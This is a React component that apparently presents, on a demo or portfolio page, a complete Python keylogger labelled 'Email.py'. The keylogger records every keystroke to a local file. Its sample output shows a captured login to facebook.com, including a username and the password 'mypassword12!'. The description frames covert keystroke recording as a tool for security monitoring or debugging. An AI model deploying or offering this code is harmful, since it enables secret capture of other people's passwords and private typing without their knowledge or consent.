import React, { useState, useEffect } from 'react';
import '../filedisplay.css';

const FileDisplayemail = () => {

  return (
    <div className="file-display-container">
      <div className="file-display-item">
        <h2 className="file-display-heading">Email.py</h2>
        <pre className="file-display-content">
          <code>
            {`
# Import necessary packages
from pynput.keyboard import Key, Listener
import logging
import os

# Set the directory and filename for the log file
log_dir = os.getcwd() + "/"
log_file = log_dir + "keylogging.txt"

# Configure the logger to write to the log file
logging.basicConfig(filename=log_file,
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the function to be called when a key is pressed
def on_press(key):
    logging.info(str(key)) # Write the key to the log file

# Start a listener to monitor key presses
with Listener(on_press=on_press) as listener:
    try:
        listener.join() # Wait for the listener to end
    except KeyboardInterrupt:
        pass # If the user interrupts the program, exit gracefully

            `}
          </code>
        </pre>
      </div>
      <div className="file-display-item">
        <h2 className="file-display-heading">Example Output</h2>
        <pre className="file-display-content">
          <code>
            {`
2023-03-28 21:50:41,985: 't'
2023-03-28 21:50:42,169: 'e'
2023-03-28 21:50:42,442: 's'
2023-03-28 21:50:42,690: 't'
2023-03-28 21:50:42,834: 'i'
2023-03-28 21:50:43,001: 'n'
2023-03-28 21:50:43,073: 'g'
2023-03-28 21:50:43,257: Key.enter
2023-03-28 21:50:46,490: 'f'
2023-03-28 21:50:46,624: 'a'
2023-03-28 21:50:46,908: 'c'
2023-03-28 21:50:47,100: 'e'
2023-03-28 21:50:47,403: 'b'
2023-03-28 21:50:47,667: 'o'
2023-03-28 21:50:47,827: 'o'
2023-03-28 21:50:48,011: 'k'
2023-03-28 21:50:48,363: '.'
2023-03-28 21:50:48,539: 'c'
2023-03-28 21:50:48,803: 'o'
2023-03-28 21:50:49,148: 'm'
2023-03-28 21:50:49,406: Key.enter
2023-03-28 21:50:53,085: 'j'
2023-03-28 21:50:53,678: 'o'
2023-03-28 21:50:55,231: 'h'
2023-03-28 21:50:56,111: 'n'
2023-03-28 21:50:59,921: '5'
2023-03-28 21:51:00,137: '5'
2023-03-28 21:51:00,524: '6'
2023-03-28 21:51:00,758: '7'
2023-03-28 21:51:08,413: 'm'
2023-03-28 21:51:08,710: 'y'
2023-03-28 21:51:09,222: 'p'
2023-03-28 21:51:09,365: 'a'
2023-03-28 21:51:09,542: 's'
2023-03-28 21:51:09,733: 's'
2023-03-28 21:51:10,624: 'w'
2023-03-28 21:51:10,895: 'o'
2023-03-28 21:51:11,103: 'r'
2023-03-28 21:51:11,343: 'd'
2023-03-28 21:51:12,448: '1'
2023-03-28 21:51:12,824: '2'
2023-03-28 21:51:13,185: Key.shift
2023-03-28 21:51:13,424: '!'
            `}
          </code>
        </pre>
      </div>
      <div className="file-display-item">
        <h2 className="file-display-heading">Description</h2>
        <p className="file-display-description">Install using: pip install pynput
        <br/>File location may be changed<br/><br/>
        The code imports necessary packages, sets the directory and filename for the log file, and configures the logger to write to the log file. It then defines a function to be called when a key is pressed and starts a listener to monitor key presses. The logger records every key pressed by the user and stores it in the log file. This code can be used for security purposes to monitor user activity or as a tool for debugging applications.
        </p>
      </div>
    </div>
  );
};

export default FileDisplayemail;
